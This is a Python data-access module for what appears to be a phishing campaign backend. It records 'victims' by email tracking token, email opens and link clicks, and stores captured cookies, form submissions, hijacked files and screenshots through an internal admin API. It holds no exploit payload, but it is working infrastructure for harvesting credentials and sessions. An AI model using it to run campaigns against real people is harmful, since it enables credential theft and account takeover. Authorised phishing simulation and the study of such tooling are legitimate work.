# campaign-backend/db/database.py

import logging
import requests
from datetime import datetime, timezone
import enum

from config import settings


logger = logging.getLogger(__name__)


DB_PATH = settings.DB_PATH
API_BASE = f"{settings.ADMIN_API_URL.rstrip('/')}/api"
CAMPAIGN_ID = settings.CAMPAIGN_ID
CAMPAIGN_API_BASE = f"{API_BASE}/campaigns/{CAMPAIGN_ID}"
TRACKING_API_BASE = f"{API_BASE}/tracking"
INTERNAL_API_KEY = settings.INTERNAL_API_KEY


# Shared authentication headers for calls to the admin backend
HEADERS = {
    "X-Internal-Api-Key": INTERNAL_API_KEY
}


class EventType(str, enum.Enum):
    # Email events
    EMAIL_SENT = "email_sent"
    EMAIL_OPENED = "email_opened"
    EMAIL_LINK_CLICKED = "email_link_clicked"

    # Victim engagement
    VICTIM_CONNECTED = "victim_connected"
    VICTIM_DISCONNECTED = "victim_disconnected"

    # Browser activity
    NAVIGATION = "navigation"
    FORM_SUBMISSION = "form_submission"
    COOKIE_CAPTURED = "cookie_captured"

    # File activity
    DOWNLOAD = "file_downloaded"
    FILE_UPLOADED = "file_uploaded"


# ========================================
# VICTIMS
# ========================================

def get_victim_by_tracking_id(tracking_id: str):
    """
    Get victim by tracking token via backend API.
    Returns victim dict or None if not found.
    """
    try:
        url = f"{CAMPAIGN_API_BASE}/victims/tracking/{tracking_id}"

        resp = requests.get(url, headers=HEADERS, timeout=5.0)

        if resp.status_code == 200:
            return resp.json()
        elif resp.status_code == 404:
            return None
        else:
            logger.warning(
                "Unexpected HTTP %s while resolving a tracking capability",
                resp.status_code,
            )
            return None

    except Exception:
        # Request exception strings include the URL, which contains the bearer
        # tracking capability. Do not persist it in logs.
        logger.error("Failed to resolve a tracking capability")
        return None


def update_victim_status(victim_id: str, status: str):
    """Update victim status via backend API"""
    try:
        url = f"{CAMPAIGN_API_BASE}/victims/{victim_id}/status"
        payload = {
            "status": status,
            "last_seen": datetime.now(timezone.utc).isoformat()
        }
        resp = requests.patch(url, json=payload, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()
        logger.info(f"🔄 Updated status for victim {victim_id}: {status}")
    except Exception as e:
        logger.error(f"❌ Failed to update victim status: {e}")


def update_victim_collected_info(victim_id: str, collected_info: dict):
    """Update victim collected browser info via backend API"""
    try:
        url = f"{CAMPAIGN_API_BASE}/victims/{victim_id}/collected_info"
        resp = requests.patch(url, json=collected_info, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()
        logger.info(f"📊 Updated collected info for victim {victim_id}")
    except Exception as e:
        logger.error(f"❌ Failed to update collected info: {e}")


def get_victim(victim_id: str):
    """Get victim by ID via backend API"""
    try:
        url = f"{CAMPAIGN_API_BASE}/victims/{victim_id}"
        resp = requests.get(url, headers=HEADERS, timeout=5.0)
        if resp.status_code == 404:
            return None
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        logger.error(f"❌ Failed to get victim: {e}")
        return None


def get_all_victims():
    """Get all victims for this campaign via backend API"""
    try:
        url = f"{CAMPAIGN_API_BASE}/victims"
        resp = requests.get(url, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()
        return resp.json().get("victims", [])
    except Exception as e:
        logger.error(f"❌ Failed to get all victims: {e}")
        return []


def get_active_victims():
    """Get all active victims for this campaign via backend API"""
    try:
        url = f"{CAMPAIGN_API_BASE}/victims"
        resp = requests.get(url, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()

        all_victims = resp.json().get("victims", [])
        active_victims = [
            victim
            for victim in all_victims
            if victim.get("is_active") is True
        ]

        logger.info(f"📊 Found {len(active_victims)} active victims")
        return active_victims
    except Exception as e:
        logger.error(f"❌ Failed to get active victims: {e}")
        return []


# ========================================
# VICTIM EVENTS
# ========================================

def add_victim_event(victim_id: str, data: dict):
    """
    Send event to backend

    Expects standard schema:
    {
      "event_type": "...",
      "timestamp": "...",     # optional (auto-generated)
      "url": "...",           # optional
      "hostname": "...",      # optional
      "title": "...",         # optional
      "description": "...",   # optional
      "payload": {...}        # required (event-specific data)
    }

    Args:
        victim_id: Victim UUID
        data: Event data including event_type and payload
    """

    # Ensure timestamp exists
    if "timestamp" not in data:
        data["timestamp"] = datetime.now(timezone.utc).isoformat()

    url = f"{CAMPAIGN_API_BASE}/victims/{victim_id}/events"

    try:
        resp = requests.post(url, json=data, headers=HEADERS, timeout=10)
        resp.raise_for_status()
        logger.info(f"✅ Event sent: {data.get('event_type')} → victim {victim_id}")
        return resp.json().get("event_id")
    except Exception:
        logger.exception(
            "Failed to send %s event for victim %s",
            data.get("event_type"),
            victim_id,
        )
        raise


def new_victim_event(
    victim_id: str,
    event_type: str,
    payload: dict,
    timestamp: str = None,
    url: str = None,
    hostname: str = None,
    title: str = None,
    description: str = None
):
    """
    Add event to backend with auto-generation of common fields

    Args:
        victim_id: Victim UUID
        event_type: Event type (form_submission, navigation, etc.)
        payload: Event-specific data
        timestamp: Optional timestamp (auto-generated if missing)
        url: Optional URL
        hostname: Optional hostname
        title: Optional title
        description: Optional description
    """

    # Build full payload
    full_payload = {
        "event_type": event_type,
        "timestamp": timestamp or datetime.now(timezone.utc).isoformat(),
        "payload": payload
    }

    if url is not None:
        full_payload["url"] = url
    if hostname is not None:
        full_payload["hostname"] = hostname
    if title is not None:
        full_payload["title"] = title
    if description is not None:
        full_payload["description"] = description

    # Send to backend
    api_url = f"{CAMPAIGN_API_BASE}/victims/{victim_id}/events"

    try:
        resp = requests.post(
            api_url,
            json=full_payload,
            headers=HEADERS,
            timeout=10
        )

        if resp.status_code == 200:
            logger.info(f"✅ Event sent: {event_type} for victim {victim_id}")
        else:
            logger.warning(f"⚠️ Event failed: {resp.status_code} - {resp.text[:200]}")

    except requests.exceptions.Timeout:
        logger.error(f"⏱️ Timeout: {event_type} for victim {victim_id}")

    except requests.exceptions.ConnectionError as e:
        logger.error(f"🔌 Connection error for victim {victim_id}: {e}")

    except Exception as e:
        logger.error(f"❌ Failed to send event for victim {victim_id}: {e}")


# ========================================
# DATA COLLECTIONS
# ========================================

def save_data_collection(
    victim_id: str,
    data_type: str,
    file_path: str = None,
    module_id: str = None,
    file_size: int = 0,
    collected_at: str = None,
    metadata: dict = None
) -> str:
    """
    Save data collection record via backend API.

    Args:
        victim_id: Victim UUID
        data_type: Type of data (screenshot, file_hijacked, download, cookie)
        file_path: Relative file path from campaign storage
        file_size: File size in bytes
        collected_at: Timestamp (auto-generated if missing)
        metadata: Additional metadata (dict)

    Returns:
        Record ID from backend
    """
    try:
        url = f"{CAMPAIGN_API_BASE}/victims/{victim_id}/data"
        payload = {
            "data_type": data_type,
            "file_path": file_path,
            "module_id": module_id,
            "file_size_bytes": file_size,
            "collected_at": collected_at or datetime.now(timezone.utc).isoformat(),
            "extra_metadata": metadata
        }

        # Rimuovi chiavi con valore None
        payload = {k: v for k, v in payload.items() if v is not None}

        resp = requests.post(url, json=payload, headers=HEADERS, timeout=10)
        resp.raise_for_status()

        record_id = resp.json().get("id")
        logger.info(f"💾 Saved {data_type} for victim {victim_id}: {file_path}")
        return record_id

    except Exception:
        logger.exception(
            "Failed to save %s data collection for victim %s",
            data_type,
            victim_id,
        )
        raise


def get_victim_data(victim_id: str, data_type: str = None):
    """Get data collections for victim via backend API"""
    try:
        url = f"{CAMPAIGN_API_BASE}/victims/{victim_id}/data"
        params = {}
        if data_type:
            params["data_type"] = data_type

        resp = requests.get(url, params=params, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()
        return resp.json().get("data", [])

    except Exception as e:
        logger.error(f"❌ Failed to get victim data: {e}")
        return []


# ========================================
# TRACKING
# ========================================

def track_email_opened(tracking_id: str, ip_address: str, user_agent: str):
    """
    Track email open event via admin backend tracking API.

    Args:
        tracking_id: Tracking token from email
        ip_address: Client IP
        user_agent: Client user agent
    """
    try:
        url = f"{TRACKING_API_BASE}/email-opened"
        payload = {
            "tracking_id": tracking_id,
            "campaign_id": CAMPAIGN_ID,
            "ip_address": ip_address,
            "user_agent": user_agent
        }

        resp = requests.post(url, json=payload, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()

        logger.info("Email-open event forwarded")
        return resp.json()

    except Exception as e:
        logger.error(f"❌ Failed to track email open: {e}")
        return None


def track_link_clicked(tracking_id: str, ip_address: str, user_agent: str):
    """
    Track link click event via admin backend tracking API.

    Args:
        tracking_id: Tracking token from email
        ip_address: Client IP
        user_agent: Client user agent

    Returns:
        Dict with landing_url or None
    """
    try:
        url = f"{TRACKING_API_BASE}/link-clicked"
        payload = {
            "tracking_id": tracking_id,
            "campaign_id": CAMPAIGN_ID,
            "ip_address": ip_address,
            "user_agent": user_agent
        }

        resp = requests.post(url, json=payload, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()

        result = resp.json()
        logger.info("Link-click event forwarded")
        return result

    except Exception as e:
        logger.error(f"❌ Failed to track link click: {e}")
        return None


# ========================================
# STATS
# ========================================

def update_campaign_stats():
    """Update campaign statistics via backend API"""
    try:
        url = f"{CAMPAIGN_API_BASE}/stats/update"
        payload = {"updated_at": datetime.now(timezone.utc).isoformat()}
        resp = requests.post(url, json=payload, headers=HEADERS, timeout=5.0)
        resp.raise_for_status()
        logger.info(f"📊 Updated stats for campaign {CAMPAIGN_ID}")
    except Exception as e:
        logger.error(f"❌ Failed to update campaign stats: {e}")
